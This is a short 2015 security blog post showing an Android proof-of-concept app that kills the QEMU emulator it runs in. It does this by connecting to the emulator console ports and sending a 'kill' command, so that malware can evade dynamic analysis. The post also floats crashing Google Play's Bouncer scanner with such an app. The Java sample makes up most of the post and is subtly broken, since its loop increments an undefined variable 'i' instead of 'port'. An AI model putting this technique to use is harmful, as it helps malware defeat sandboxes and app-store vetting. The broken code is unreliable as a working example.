---
layout: post
title:  "Using the Android qemu console for dynamic analysis evasion"
date:   2015-02-10 17:34:24
author: qkaiser
excerpt: |
    I’ve been playing with the android emulator recently and I kept thinking about how malwares could be using that emulator console to - quite aggresively - evade dynamic analysis by just killing the emulator that is used to analyze them.
comments: true
categories: android security malware
---


I've been playing with the android emulator recently and I kept thinking about
how malwares could be using that emulator console to - quite aggresively -
evade dynamic analysis by just killing the emulator that is used to analyze
them.

I wrote a simple application example that will kill the emulator when you run
the application in it, whatever the port on which the emulator is listening.

The example I provide is really simple but I really like the idea of just
keeping annoying a malware reverser by killink its sandbox :)

### Sample application

{% highlight java %}
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new Connection().execute();
    }

    private class Connection extends AsyncTask {
        @Override
        protected Object doInBackground(Object... arg0) {
            evade();
            return null;
        }
    }

    private void evade() {
        try{
            for(int port=5554; port <= 5584; i+=2) {
                Socket s = new Socket("10.0.2.2", port);
                BufferedWriter out = new BufferedWriter(
                    new OutputStreamWriter(s.getOutputStream())
                );
                out.write("kill\n");
                out.flush();
                out.close();
                s.close();
            }
        } catch (Exception ex) {
            ex.getMessage();
        }
    }
}
{% endhighlight %}

In this example, the application will try to connect to any port where an
emulator is allowed to listen and issue a `kill` command if connection is
successful.

### Examples in the wild

I've never heard of any Android malwares using this kind of technique but if
you have some good examples, please let me know !

### Security Impact

I'm not sure there is any real security impact here but as Bouncer is using
this emulator to perform dynamic analysis of applications being pushed to the
Google Play, it might be possible to make Bouncer go crazy by uploading a
malicious application.
